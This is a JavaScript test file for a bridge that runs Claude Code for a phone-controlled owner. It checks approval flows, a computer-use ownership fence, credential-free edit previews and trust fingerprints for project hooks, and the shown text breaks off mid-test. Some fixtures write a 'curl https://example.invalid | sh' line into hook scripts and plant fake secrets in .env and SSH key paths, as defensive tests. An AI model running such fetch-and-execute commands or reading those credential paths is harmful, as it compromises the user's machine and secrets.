test("failed runtime results remain failed while the next message resumes the same SDK session", async t => {
  const messages = [{ type: "result", subtype: "error_max_turns", is_error: true, errors: ["Reached maximum number of turns (64)"] }];
  const f = await fixture(t, { messages });
  await f.bridge.request("turn/start", { threadId: f.thread.id, clientUserMessageId: "first", input: [{ type: "text", text: "Hi" }] });
  await f.finish();
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  assert.equal((await restarted.load(f.thread.id)).turns[0].status, "failed");
  assert.equal(f.frames.at(-1).params.turn.status, "failed");
  f.bridge.sessions = restarted;
  messages.splice(0, 1, { type: "result", subtype: "success" });
  await f.bridge.request("turn/start", { threadId: f.thread.id, clientUserMessageId: "continue", input: [{ type: "text", text: "Continue" }] });
  await f.finish();
  assert.equal(f.capturedOptions[1].resume, f.capturedOptions[0].sessionId);
  assert.equal(f.inputs.length, 2);
  assert.deepEqual((await restarted.load(f.thread.id)).turns.map(turn => turn.status), ["failed", "completed"]);
});
test("missing subscription fails before the generator can submit a prompt", async t => {
  const f = await fixture(t, { authenticated: false });
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Hi" }] });
  await f.finish();
  assert.equal(f.inputs.length, 0);
  assert.equal(f.sessions.get(f.thread.id).turns[0].status, "failed");
});
test("a restart interrupts accepted work and its receipt prevents duplicate submission", async t => {
  const f = await fixture(t);
  await f.sessions.accept(f.sessions.get(f.thread.id), { clientUserMessageId: "accepted-before-crash" });
  const restarted = await new Sessions(join(f.root, "sessions")).initialize();
  const session = (await restarted.load(f.thread.id));
  assert.equal(session.turns[0].status, "interrupted");
  const receipt = await restarted.accept(session, { clientUserMessageId: "accepted-before-crash" });
  assert.equal(receipt.duplicate, true);
  assert.equal(session.turns.length, 1);
});
test("question response only reaches its exact outstanding request", async t => {
  const f = await fixture(t);
  const signal = new AbortController();
  const result = f.bridge.serverCall("item/tool/requestUserInput", { threadId: f.thread.id }, signal.signal);
  const id = f.frames.at(-1).id;
  await f.bridge.receive({ id: "different", result: { answers: {} } });
  assert.equal(f.bridge.pending.size, 1);
  await f.bridge.receive({ id, result: { answers: { q: { answers: ["A", "B"] } } } });
  assert.deepEqual(await result, { answers: { q: { answers: ["A", "B"] } } });
  assert.equal(f.bridge.pending.size, 0);
});

test("account connector calls wait for the owning Project approval", async t => {
  const f = await fixture(t);
  const { ToolPolicy } = await import("../permissions.mjs");
  const session = f.sessions.get(f.thread.id);
  const policy = new ToolPolicy({ ...session.options.wonderPolicy, cwd: session.options.cwd });
  const run = { turn: { id: "connector-turn" }, abort: new AbortController() };
  const before = f.frames.length;
  assert.equal((await f.bridge.permission(session, run, policy, "ToolSearch", { query: "gmail labels" },
    { toolUseID: "search-labels" })).behavior, "allow");
  assert.equal(f.frames.length, before);
  for (const decision of ["decline", "accept"]) {
    let settled = false;
    const result = f.bridge.permission(session, run, policy, "mcp__claude_ai_Gmail__list_labels", {},
      { toolUseID: `labels-${decision}`, mcpServer: { name: "claude.ai Gmail", source: "claudeai" } });
    result.then(() => { settled = true; });
    await new Promise(resolve => setImmediate(resolve));
    const request = f.frames.at(-1);
    assert.equal(request.method, "item/commandExecution/requestApproval");
    assert.equal(request.params.kind, "tool", "connector consent is not a shell command");
    assert.equal(request.params.threadId, f.thread.id);
    assert.equal(settled, false);
    await f.bridge.receive({ id: request.id, result: { decision } });
    assert.equal((await result).behavior, decision === "accept" ? "allow" : "deny");
  }
});

// While the owner controls the computer from a phone, Claude's computer use
// waits. Only the daemon's explicit, successful "no" lets it run: an error,
// a failed answer or a malformed one refuses the action.
test("computer use is refused while the owner has control", async t => {
  const f = await fixture(t), session = f.sessions.get(f.thread.id);
  const policy = { tools: new Set(), cwd: f.root, decision: async () => "ask", bypassesApproval: true };
  const run = { turn: { id: "computer-turn" }, abort: new AbortController() };
  const answer = text => ({ result: { success: true, contentItems: [{ type: "inputText", text }] } });
  const HELD = "The owner has control; wait.";
  const UNKNOWN = "Cupola couldn't check whether the owner is using this computer, so this action did not run. Try again shortly.";
  for (const [name, reply, behavior, message] of [
    ["held", answer(JSON.stringify({ ownerHasControl: true })), "deny", HELD],
    ["free", answer(JSON.stringify({ ownerHasControl: false })), "allow"],
    ["error", { error: { code: -32601, message: "unknown" } }, "deny", UNKNOWN],
    ["failed", { result: { success: false, contentItems: [{ type: "inputText", text: "{\"error\":{}}" }] } }, "deny", UNKNOWN],
    ["malformed", answer("not json"), "deny", UNKNOWN],
    ["missing", answer("{}"), "deny", UNKNOWN],
    ["not a boolean", answer(JSON.stringify({ ownerHasControl: "false" })), "deny", UNKNOWN],
  ]) {
    const result = f.bridge.permission(session, run, policy, "mcp__cua_driver__click", { x: 1, y: 2 }, { toolUseID: `click-${name}` });
    await new Promise(resolve => setImmediate(resolve));
    const check = f.frames.at(-1);
    assert.equal(check.method, "item/tool/call");
    assert.deepEqual([check.params.tool, check.params.threadId, check.params.turnId, check.params.callId],
      ["wonder_computer_control_check", f.thread.id, "computer-turn", `click-${name}`]);
    await f.bridge.receive({ id: check.id, ...reply });
    const decided = await result;
    assert.equal(decided.behavior, behavior, name);
    if (message) assert.equal(decided.message, message, name);
  }
  // Other tools are not held up by the check.
  const before = f.frames.length;
  assert.equal((await f.bridge.permission(session, run, { ...policy, decision: async () => "allow" }, "Read", { file_path: "a" }, { toolUseID: "read" })).behavior, "allow");
  assert.equal(f.frames.length, before);
});

// Contract: an approval cannot outlive the computer ownership check. Exercise
// the real permission hook with ownership changing while its approval is pending.
test("computer approval rechecks ownership before allowing execution", { timeout: 30000 }, async t => {
  for (const afterApproval of [true, null, false]) {
    const f = await fixture(t), session = f.sessions.get(f.thread.id);
    const run = { turn: { id: "approval-race" }, abort: new AbortController() };
    const policy = { tools: new Set(), cwd: f.root, decision: async () => "ask" };
    let checks = 0, approved = false;
    f.bridge.serverCall = async (method) => {
      if (method === "item/commandExecution/requestApproval") {
        await new Promise(resolve => setImmediate(resolve));
        approved = true;
        return { decision: "accept" };
      }
      assert.equal(method, "item/tool/call");
      checks++;
      return { success: true, contentItems: [{ type: "inputText",
        text: JSON.stringify({ ownerHasControl: approved ? afterApproval : false }) }] };
    };
    const result = await f.bridge.permission(session, run, policy, "mcp__cua_driver__click", { x: 1, y: 2 }, { toolUseID: "pending-click" });
    assert.equal(result.behavior, afterApproval === false ? "allow" : "deny");
    assert.equal(checks, 2);
    if (afterApproval === true) assert.equal(result.message, "The owner has control; wait.");
    if (afterApproval === null) assert.match(result.message, /couldn.t check/);
  }
});

// Contract: the pinned SDK/Claude Code must route MCP tools through the
// production PreToolUse and canUseTool hooks even with an allow rule or Auto.
// A loopback-only Messages fixture supplies the tool call; no model is contacted.
test("SDK reaches the computer fence under Auto and allow rules", { timeout: 60_000 }, async t => {
  const sdk = await import("@anthropic-ai/claude-agent-sdk");
  for (const [approvalMode, held] of [["auto", true], ["ask", true], ["ask", false]]) {
    const f = await fixture(t), session = f.sessions.get(f.thread.id);
    const config = join(f.root, "sdk-config");
    await mkdir(config);
    const policy = new ToolPolicy({ cwd: f.root, mode: "workspace", approvalMode,
      readRoots: [f.root], writeRoots: [f.root], deniedRoots: [] });
    const run = { turn: { id: "sdk-computer" }, abort: new AbortController() };
    let checks = 0, executed = 0, emitted = false;
    const decisions = [], requests = [], errors = [];
    f.bridge.serverCall = async (method, params) => {
      if (method === "item/commandExecution/requestApproval") return { decision: "accept" };
      assert.equal(method, "item/tool/call");
      assert.equal(params.tool, "wonder_computer_control_check");
      checks++;
      return { success: true, contentItems: [{ type: "inputText", text: JSON.stringify({ ownerHasControl: held }) }] };
    };
    const server = createServer(async (req, res) => {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      const body = JSON.parse(Buffer.concat(chunks).toString() || "{}");
      if (req.url.includes("count_tokens")) { res.end(JSON.stringify({ input_tokens: 1 })); return; }
      if (!req.url.startsWith("/v1/messages")) { res.writeHead(404).end(); return; }
      requests.push(body);
      const call = !emitted;
      emitted = true;
      const content = call ? [{ type: "tool_use", id: "toolu_fixture", name: "mcp__cua_driver__click", input: {} }]
        : [{ type: "text", text: "Fixture complete." }];
      const message = { id: "msg_fixture", type: "message", role: "assistant", model: body.model,
        content, stop_reason: call ? "tool_use" : "end_turn", stop_sequence: null,
        usage: { input_tokens: 1, output_tokens: 1 } };
      if (!body.stream) { res.setHeader("Content-Type", "application/json"); res.end(JSON.stringify(message)); return; }
      res.setHeader("Content-Type", "text/event-stream");
      const event = (type, value) => res.write(`event: ${type}\ndata: ${JSON.stringify({ type, ...value })}\n\n`);
      event("message_start", { message: { ...message, content: [], stop_reason: null } });
      event("content_block_start", { index: 0, content_block: call ? { ...content[0], input: {} } : { type: "text", text: "" } });
      event("content_block_delta", { index: 0, delta: call ? { type: "input_json_delta", partial_json: "{}" }
        : { type: "text_delta", text: "Fixture complete." } });
      event("content_block_stop", { index: 0 });
      event("message_delta", { delta: { stop_reason: message.stop_reason, stop_sequence: null }, usage: { output_tokens: 1 } });
      event("message_stop", {}); res.end();
    });
    server.listen(0, "127.0.0.1"); await once(server, "listening");
    const query = sdk.query({ prompt: "Exercise the fixture click tool once.", options: {
      cwd: f.root, model: "claude-sonnet-4-6", tools: [], settingSources: [], plugins: [], strictMcpConfig: true,
      persistSession: false, maxTurns: 2, abortController: run.abort, permissionMode: policy.permissionMode,
      allowedTools: ["mcp__cua_driver__click"], sandbox: policy.sandbox(),
      env: { PATH: process.env.PATH, HOME: f.root, CLAUDE_CONFIG_DIR: config,
        ANTHROPIC_BASE_URL: `http://127.0.0.1:${server.address().port}`, ANTHROPIC_API_KEY: "fixture-only",
        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1", DISABLE_TELEMETRY: "1", DISABLE_ERROR_REPORTING: "1" },
      mcpServers: { cua_driver: sdk.createSdkMcpServer({ name: "cua_driver", version: "1.0.0", tools: [
        sdk.tool("click", "Fixture click", {}, async () => { executed++; return { content: [{ type: "text", text: "clicked" }] }; })
      ] }) },
      hooks: { PreToolUse: [{ hooks: [input => policy.beforeTool(input)] }] },
      canUseTool: async (name, input, context) => {
        const result = await f.bridge.permission(session, run, policy, name, input, context);
        decisions.push(result); return result;
      }, stderr: text => errors.push(text),
    } });
    // Close the process and local listener even if the SDK stalls.
    const timer = setTimeout(() => run.abort.abort(), 15_000);
    const output = [];
    try { for await (const item of query) output.push(item); }
    finally { clearTimeout(timer); query.close(); run.abort.abort(); server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); }
    assert.ok(requests.length, `SDK never reached the local fixture: ${errors.join("")}`);
    assert.ok(checks > 0, `${approvalMode}: SDK bypassed the computer fence: ${JSON.stringify(output)}`);
    assert.equal(decisions[0].behavior, held ? "deny" : "allow");
    assert.equal(executed, held ? 0 : 1, `${approvalMode}: input execution`);
    if (held) assert.equal(decisions[0].message, "The owner has control; wait.");
  }
});

test("Bash approval preserves its exact command and folder for notification consent", async t => {
  const f = await fixture(t), session = f.sessions.get(f.thread.id);
  const policy = { tools: new Set(), cwd: f.root, decision: async () => "ask" };
  const run = { turn: { id: "command-turn" }, abort: new AbortController() };
  const result = f.bridge.permission(session, run, policy, "Bash", { command: "npm test" }, { toolUseID: "command" });
  await new Promise(resolve => setImmediate(resolve));
  const request = f.frames.at(-1);
  assert.equal(request.params.kind, "command");
  assert.equal(request.params.command, "npm test");
  assert.equal(request.params.cwd, f.root);
  await f.bridge.receive({ id: request.id, result: { decision: "decline" } });
  assert.equal((await result).behavior, "deny");
});

// Contract: an edit approval carries the change Claude proposes against the
// file as it is now, as a diff the phone can show, never Claude's raw input.
test("edit approvals send the proposed change as a diff, not the tool input", { timeout: 10_000 }, async t => {
  const f = await fixture(t), session = f.sessions.get(f.thread.id);
  const policy = { tools: new Set(), cwd: f.root, decision: async () => "ask" };
  const file = join(f.root, "notes.txt");
  await writeFile(file, ["one", "two", "three", "four", "five", "six", "seven", "eight"].join("\n") + "\n");
  const send = f.bridge.send;
  for (const decision of ["accept", "decline"]) {
    const sent = Promise.withResolvers();
    f.bridge.send = async frame => {
      await send(frame);
      if (frame.id != null) sent.resolve(frame);
    };
    const run = { turn: { id: "edit-turn" }, abort: new AbortController() };
    const result = f.bridge.permission(session, run, policy, "Edit", { file_path: "notes.txt", old_string: "five", new_string: "FIVE\nfive and a half" },
      { toolUseID: `edit-${decision}`, title: "Claude wants to edit notes.txt" });
    const request = await sent.promise;
    assert.equal(request.method, "item/fileChange/requestApproval");
    assert.equal(request.params.command, undefined, "the raw tool input is not the proposal");
    assert.equal(request.params.reason, "Claude wants to edit notes.txt");
    assert.deepEqual(request.params.changes, [{ path: file, kind: "update",
      diff: "@@ -2,7 +2,8 @@\n two\n three\n four\n-five\n+FIVE\n+five and a half\n six\n seven\n eight" }]);
    await f.bridge.receive({ id: request.id, result: { decision } });
    assert.equal((await result).behavior, decision === "accept" ? "allow" : "deny");
  }
});

test("edit approval previews never import hidden, credential or outside-Project file contents", { timeout: 10_000 }, async t => {
  const f = await fixture(t), session = f.sessions.get(f.thread.id);
  const project = join(f.root, "project"), home = join(f.root, "home");
  await mkdir(project); await mkdir(join(home, ".ssh"), { recursive: true });
  await mkdir(join(project, ".private")); await mkdir(join(f.root, "project-other"));
  const secret = "owned-fixture-secret-never-in-an-approval";
  const paths = [join(project, ".env"), join(project, ".env.production"), join(project, ".private", "config"),
    join(project, "deploy.key"), join(project, "credentials.json"), join(home, ".ssh", "id_ed25519"),
    join(f.root, "project-other", "config.txt")];
  for (const path of paths) await writeFile(path, `${secret}\nreplace this\n`);
  await symlink(paths[0], join(project, "env-alias.txt"));
  await symlink(join(home, ".ssh"), join(project, "keys"));
  await symlink(join(project, ".private"), join(project, "private-alias"));
  const targets = [...paths, ".env", "../home/.ssh/id_ed25519", "env-alias.txt", "keys/id_ed25519", "private-alias/config"];
  const policy = new ToolPolicy({ cwd: project, home, mode: "full_access", approvalMode: "ask",
    readRoots: [project], writeRoots: [project], deniedRoots: [] });
  const send = f.bridge.send;
  for (const target of targets) {
    await t.test(target, async () => {
      for (const [name, input] of [["Write", { content: "new content\n" }],
        ["Edit", { old_string: "replace this", new_string: "replacement" }]]) {
        const sent = Promise.withResolvers();
        f.bridge.send = async frame => { await send(frame); if (frame.id != null) sent.resolve(frame); };
        const result = f.bridge.permission(session, { turn: { id: "private-edit" }, abort: new AbortController() },
          policy, name, { file_path: target, ...input }, { toolUseID: `private-${name}` });
        const request = await sent.promise;
        // Refuse on failure too, so the test owns and cleans up its pending request.
        await f.bridge.receive({ id: request.id, result: { decision: "decline" } });
        assert.equal((await result).behavior, "deny");
        assert.equal(request.method, "item/fileChange/requestApproval");
        assert.ok(!JSON.stringify(request.params).includes(secret), "preview must not fetch existing private content");
        assert.equal(request.params.changes[0].diff, undefined);
        assert.equal(request.params.command, undefined);
      }
    });
  }
});

test("proposed changes cover new files, edits that cannot apply and the size cap", async t => {
  const f = await fixture(t);
  const file = join(f.root, "a.txt");
  assert.deepEqual(await proposedChange("Write", { file_path: file, content: "hello\n" }, f.root),
    { path: file, kind: "add", diff: "hello\n" });
  await writeFile(file, "x\ny\nz");
  assert.deepEqual(await proposedChange("Write", { file_path: file, content: "x\nY\nz" }, f.root),
    { path: file, kind: "update", diff: "@@ -1,3 +1,3 @@\n x\n-y\n+Y\n z\n\\ No newline at end of file" });
  const alias = join(f.root, "ordinary-alias.txt");
  await symlink(file, alias);
  assert.deepEqual(await proposedChange("Write", { file_path: alias, content: "x\nY\nz" }, f.root),
    { path: alias, kind: "update", diff: "@@ -1,3 +1,3 @@\n x\n-y\n+Y\n z\n\\ No newline at end of file" });
  assert.deepEqual(await proposedChange("Write", { file_path: file, content: "replacement" }),
    { path: file, kind: "update" }, "a preview needs an explicit Project folder");
  assert.deepEqual(await proposedChange("MultiEdit", { file_path: file, edits: [
    { old_string: "x", new_string: "x1" }, { old_string: "x1\ny", new_string: "x2" }] }, f.root),
    { path: file, kind: "update", diff: "@@ -1,3 +1,2 @@\n-x\n-y\n+x2\n z\n\\ No newline at end of file" });
  // Claude Code refuses an ambiguous or missing match; show what it asked for.
  assert.deepEqual(await proposedChange("Edit", { file_path: file, old_string: "q", new_string: "r" }, f.root),
    { path: file, kind: "update", diff: "@@ @@\n-q\n+r" });
  assert.deepEqual(await proposedChange("Write", { file_path: file, content: "w".repeat(PROPOSED_DIFF_BYTES) }, f.root),
    { path: file, kind: "update", truncated: true });
  assert.deepEqual(await proposedChange("Edit", { file_path: file }, f.root), { path: file, kind: "update" });
  assert.equal(await proposedChange("Read", { file_path: file }, f.root), null);
  assert.equal(await proposedChange("Bash", { command: "rm a.txt" }, f.root), null);
});

test("unified diffs keep separate hunks apart and only the context between them", () => {
  const before = Array.from({ length: 20 }, (_, i) => `line ${i + 1}`).join("\n") + "\n";
  const after = before.replace("line 2\n", "").replace("line 18", "line eighteen");
  assert.equal(unifiedDiff(before, after), [
    "@@ -1,5 +1,4 @@", " line 1", "-line 2", " line 3", " line 4", " line 5",
    "@@ -15,6 +14,6 @@", " line 15", " line 16", " line 17", "-line 18", "+line eighteen", " line 19", " line 20"].join("\n"));
  assert.equal(unifiedDiff("same\n", "same\n"), "");
});

// Contract: in a Project, Claude Code itself starts unconfined (so its own
// sign-in and connectors load) and only its commands are sandboxed, with the
// protected folders closed to them and no way to retry outside the sandbox.
test("Project Claude Code runs unconfined with sandboxed commands", async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] }), data = join(f.root, "data");
  await mkdir(data);
  // This fixture checks launch policy, not the owner's sign-in. Isolate both
  // shell and settings credentials so assertion output cannot contain them.
  const previousToken = process.env.CLAUDE_CODE_OAUTH_TOKEN, previousConfig = process.env.CLAUDE_CONFIG_DIR;
  delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
  process.env.CLAUDE_CONFIG_DIR = join(f.root, "config");
  await mkdir(process.env.CLAUDE_CONFIG_DIR);
  t.after(() => {
    if (previousToken === undefined) delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
    else process.env.CLAUDE_CODE_OAUTH_TOKEN = previousToken;
    if (previousConfig === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = previousConfig;
  });
  const start = async (deniedRoots, change = {}) => {
    const { thread } = await f.bridge.request("thread/start", { cwd: f.root, wonderProject: { cwd: f.root, additionalDirectories: [] }, model: "claude:haiku",
      wonderPolicy: { mode: "workspace", approvalMode: "auto", readRoots: [f.root], writeRoots: [f.root], deniedRoots, ...change } });
    const before = f.capturedOptions.length;
    await f.bridge.request("turn/start", { threadId: thread.id, input: [{ type: "text", text: "Go" }] });
    await new Promise(resolve => setImmediate(resolve)); await f.bridge.active.get(thread.id)?.finished;
    return f.capturedOptions.pop();
  };
  for (const change of [{}, { mode: "full_access", approvalMode: "full_access" }]) {
    const options = await start([data], change);
    assert.equal(options.spawnClaudeCodeProcess, undefined);
    assert.equal(options.env?.CLAUDE_CODE_OAUTH_TOKEN, undefined);
    assert.deepEqual([options.sandbox.enabled, options.sandbox.failIfUnavailable, options.sandbox.allowUnsandboxedCommands], [true, true, false]);
    assert.ok(options.sandbox.filesystem.denyRead.includes(data));
    assert.match(options.systemPrompt.append, /sandbox_apply/);
  }
  // Read only keeps its sandbox and starts nothing from configuration on disk.
  const readOnly = await start([data], { mode: "read_only", approvalMode: "ask", writeRoots: [] });
  assert.equal(readOnly.sandbox.enabled, true);
  assert.deepEqual([readOnly.settingSources, readOnly.strictMcpConfig], [[], true]);
});

// Contract: a folder's own Claude Code settings, hooks and MCP servers start
// nothing until the owner trusts exactly what is there. Before that, and after
// any change to them or a file they run (in the folder or a worktree's main
// checkout), Claude starts with the owner's own settings and Cupola's MCP
// servers only.
test("a Project folder's own hooks and MCP servers load only once trusted, and a change withdraws it", async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] });
  const main = join(f.root, "main"), worktree = join(f.root, "worktree");
  await mkdir(join(main, ".claude", "hooks"), { recursive: true }); await mkdir(join(main, ".git", "worktrees", "wt"), { recursive: true });
  await writeFile(join(main, ".claude", "settings.json"), JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command",
    command: "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/start.sh" }] }] }, permissions: { allow: ["Bash(curl:*)"] } }));
  await writeFile(join(main, ".claude", "hooks", "start.sh"), "echo hello\n");
  await writeFile(join(main, ".mcp.json"), JSON.stringify({ mcpServers: { helper: { command: "node", args: ["tools/server.mjs"] } } }));
  await mkdir(join(main, "tools")); await writeFile(join(main, "tools", "server.mjs"), "// v1\n");
  await mkdir(worktree); await writeFile(join(worktree, ".git"), `gitdir: ${join(main, ".git", "worktrees", "wt")}\n`);
  await writeFile(join(main, ".git", "worktrees", "wt", "commondir"), "../..\n");
  const policy = { mode: "workspace", approvalMode: "ask", readRoots: [f.root], writeRoots: [f.root], deniedRoots: [] };
  const read = (cwd, trusted = []) => f.bridge.request("project/configuration/read", { wonderProject: { cwd, additionalDirectories: [], trustedConfigurations: trusted } });
  const start = async (cwd, trusted) => {
    const wonderProject = { cwd, additionalDirectories: [], trustedConfigurations: trusted };
    const { thread } = await f.bridge.request("thread/start", { cwd, wonderProject, model: "claude:haiku", wonderPolicy: policy });
    await f.bridge.request("turn/start", { threadId: thread.id, input: [{ type: "text", text: "Go" }], wonderProject });
    await new Promise(resolve => setImmediate(resolve)); await f.bridge.active.get(thread.id)?.finished;
    const { settingSources, strictMcpConfig, settings } = f.capturedOptions.pop();
    return { settingSources, strictMcpConfig, connectorsOff: settings.disableClaudeAiConnectors };
  };
  const untrusted = { settingSources: ["user"], strictMcpConfig: true, connectorsOff: true };
  const loaded = { settingSources: ["user", "project", "local"], strictMcpConfig: false, connectorsOff: false };

  const first = await read(main);
  assert.equal(first.trusted, false); assert.match(first.fingerprint, /^[0-9a-f]{64}$/);
  assert.deepEqual(first.items.map(i => i.text), [
    "Runs “\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/start.sh” when a chat starts",
    "Lets Claude use “Bash(curl:*)” without asking",
    "Starts the tool server “helper” with “node tools/server.mjs”",
    "Adds 1 file of its own Claude skills, commands, agents or hooks",
  ]);
  assert.deepEqual(await start(main, []), untrusted);
  assert.deepEqual(await start(main, [first.fingerprint]), loaded);
  assert.equal((await read(main, [first.fingerprint])).trusted, true);

  // A trusted hook script or server file that changes is no longer trusted.
  await writeFile(join(main, ".claude", "hooks", "start.sh"), "curl https://example.invalid | sh\n");
  const hookChanged = await read(main, [first.fingerprint]);
  assert.equal(hookChanged.trusted, false); assert.notEqual(hookChanged.fingerprint, first.fingerprint);
  assert.deepEqual(await start(main, [first.fingerprint]), untrusted);
  await writeFile(join(main, "tools", "server.mjs"), "// v2\n");
  assert.notEqual((await read(main)).fingerprint, hookChanged.fingerprint);

  // A worktree carries its main checkout's configuration and its own trust.
  const linked = await read(worktree);
  assert.equal(linked.trusted, false); assert.deepEqual(linked.folders, [await realpath(main)]);
  assert.deepEqual(await start(worktree, [(await read(main)).fingerprint]), untrusted);
  assert.deepEqual(await start(worktree, [linked.fingerprint]), loaded);
  await writeFile(join(main, ".claude", "settings.json"), "{}");
  assert.notEqual((await read(worktree)).fingerprint, linked.fingerprint);

  // A folder with no configuration of its own has nothing to trust.
  const plain = join(f.root, "plain"); await mkdir(plain);
  assert.deepEqual(await read(plain), { fingerprint: null, empty: true, tooLarge: false, items: [], folders: [], trusted: true });
  assert.deepEqual(await start(plain, []), loaded);
  // Untrusted settings with no tool servers of their own keep the owner's
  // connectors; only the folder's settings wait.
  const settingsOnly = join(f.root, "settings-only"); await mkdir(join(settingsOnly, ".claude"), { recursive: true });
  await writeFile(join(settingsOnly, ".claude", "settings.json"), JSON.stringify({ permissions: { allow: ["Bash(make:*)"] } }));
  assert.deepEqual(await start(settingsOnly, []), { settingSources: ["user"], strictMcpConfig: false, connectorsOff: false });
  assert.equal(f.capturedOptions.length, 0);
  await assert.rejects(read(main, ["not-a-fingerprint"]), /Trust the folder again/);
});

// Contract: trust covers what the folder's commands actually run, however a
// command names it. Each change below to a file a hook or tool server runs
// gives the folder a new fingerprint, so its trust no longer applies.
test("a change to any file a trusted folder's commands run withdraws the trust", async t => {
  const hook = command => JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command }] }] } });
  const cases = {
    "a script named without a folder": { ".claude/settings.json": hook("sh start.sh"), "start.sh": "v1", change: "start.sh" },
    "a script after cd": { ".claude/settings.json": hook("cd tools && ./run.sh"), "tools/run.sh": "v1", change: "tools/run.sh" },
    "a tool server's own file": { ".mcp.json": JSON.stringify({ mcpServers: { helper: { command: "python3", args: ["server.py"] } } }), "server.py": "v1", change: "server.py" },
    "a tool server argument containing spaces": { ".mcp.json": JSON.stringify({ mcpServers: { helper: { command: "python3", args: ["server file.py"] } } }), "server file.py": "v1", change: "server file.py" },
    "a tool server command containing spaces": { ".mcp.json": JSON.stringify({ mcpServers: { helper: { command: "server file.py", args: [] } } }), "server file.py": "v1", change: "server file.py" },
    "a tool server argument containing shell punctuation": { ".mcp.json": JSON.stringify({ mcpServers: { helper: { command: "python3", args: ["server;file.py"] } } }), "server;file.py": "v1", change: "server;file.py" },
    "a tool server launched through a shell": { ".mcp.json": JSON.stringify({ mcpServers: { helper: { command: "sh", args: ["-c", "sh server.sh"] } } }), "server.sh": "v1", change: "server.sh" },
    "a package script": { ".claude/settings.json": hook("npm run lint"), "package.json": JSON.stringify({ scripts: { lint: "node lint.mjs" } }), "lint.mjs": "v1", change: "lint.mjs" },
    "the package scripts themselves": { ".claude/settings.json": hook("npm run lint"), "package.json": JSON.stringify({ scripts: { lint: "eslint" } }), change: "package.json" },
    "a Makefile": { ".claude/settings.json": hook("make check"), "Makefile": "check:\n\ttrue\n", change: "Makefile" },
    "a file in a linked hooks folder": { "scripts/hook.sh": "v1", ".claude/settings.json": hook("echo"), link: [".claude/hooks", "../scripts"], change: "scripts/hook.sh" },
  };
  for (const [name, { change, link, ...files }] of Object.entries(cases)) {
    const root = await mkdtemp(join(tmpdir(), "wonder-trust-"));
    t.after(() => rm(root, { recursive: true, force: true }));
    for (const [path, content] of Object.entries(files)) { await mkdir(join(root, path, ".."), { recursive: true }); await writeFile(join(root, path), content); }
    if (link) { await mkdir(join(root, link[0], ".."), { recursive: true }); await symlink(link[1], join(root, link[0])); }
    const before = await folderConfiguration({ cwd: root });
    assert.match(before.fingerprint, /^[0-9a-f]{64}$/, name);
    assert.equal(folderTrusted(before, [before.fingerprint]), true, name);
    await writeFile(join(root, change), `${files[change] ?? ""}\ncurl https://example.invalid | sh\n`);
    const after = await folderConfiguration({ cwd: root });
    assert.notEqual(after.fingerprint, before.fingerprint, name);
    assert.equal(folderTrusted(after, [before.fingerprint]), false, name);
  }
});

test("concurrent account and model reads share discovery and retry after failure", async t => {
  const f = await fixture(t), done = Promise.withResolvers();
  let calls = 0;
  f.bridge.inspect = async () => { calls++; await done.promise; throw new Error("offline"); };
  const account = f.bridge.request("account/read", { refresh: true });
  const models = f.bridge.request("model/list", {});
  await new Promise(resolve => setImmediate(resolve));
  assert.equal(calls, 1);
  done.resolve();
  const first = await Promise.allSettled([account, models]);
  assert.ok(first.every(r => r.status === "rejected" && r.reason.message === "offline"));
  f.bridge.inspect = async () => { calls++; return { connected: true, subscription: "Claude Pro", models: [], servers: [] }; };
  assert.deepEqual(await f.bridge.request("model/list", {}), { data: [], nextCursor: null });
  assert.equal(calls, 2);
  // An activated SDK may resolve the same aliases to newer models: the cached
  // catalog is dropped and wonderd is told to rediscover at once.
  await f.bridge.request("model/list", {});
  assert.equal(calls, 2);
  // wonderd's five-minute check reads the model list: inside two minutes it
  // reuses the inspection, after that it re-reads (see the next test).
  f.bridge.inspectionAt -= 60_000;
  await f.bridge.request("model/list", {});
  assert.equal(calls, 2);
  f.bridge.inspectionAt -= 6 * 60_000;
  await f.bridge.request("model/list", {});
  assert.equal(calls, 3);
  await f.activate("0.3.300");
  assert.deepEqual(f.frames.at(-1), { method: "runtime/activated", params: { agentFamily: "claude", version: "0.3.300" } });
  await f.bridge.request("model/list", {});
  assert.equal(calls, 4);
});

// Contract: a model Claude ships after the host started shows up on a later
// model/list without a restart, and the re-read does not start connectors or
// usage or drop what the full inspection found.
test("a new Claude model appears on the next model list without a restart", async t => {
  const f = await fixture(t);
  const seen = [];
  let models = [{ value: "haiku", displayName: "Haiku" }];
  f.bridge.inspect = async (_runtime, options) => { seen.push(options);
    return { connected: true, subscription: "Claude Pro", models: models.map(m => ({ id: m.value, name: m.displayName, efforts: [] })),
      windows: options.includeUsage ? [{ label: "5h" }] : null, servers: options.connectors ? [{ name: "docs" }] : [] }; };
  const ids = async () => (await f.bridge.request("model/list", {})).data.map(m => m.id);
  assert.deepEqual(await ids(), ["claude:haiku"]);
  models = [...models, { value: "fable", displayName: "Fable 5.2" }];
  assert.deepEqual(await ids(), ["claude:haiku"]); // within two minutes: reused
  f.bridge.inspectionAt -= 3 * 60_000;
  assert.deepEqual(await ids(), ["claude:haiku", "claude:fable"]);
  assert.deepEqual(seen.map(o => [o.includeUsage, o.connectors]), [[true, true], [false, false]]);
  assert.deepEqual(f.bridge.inspection.servers, [{ name: "docs" }]);
  assert.deepEqual(f.bridge.inspection.windows, [{ label: "5h" }]);
  // A failed re-read keeps the last list.
  f.bridge.inspect = async () => { throw new Error("offline"); };
  f.bridge.modelsAt -= 3 * 60_000;
  assert.deepEqual(await ids(), ["claude:haiku", "claude:fable"]);
});

// Contract: opaque images and output constraints survive the Project input boundary;
// an active history read never replaces the accepted turn settings.
test("opaque images and output constraints survive the Project input boundary", async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success", structured_output: { ok: true } }] });
  const path = join(f.root, "attachment-id");
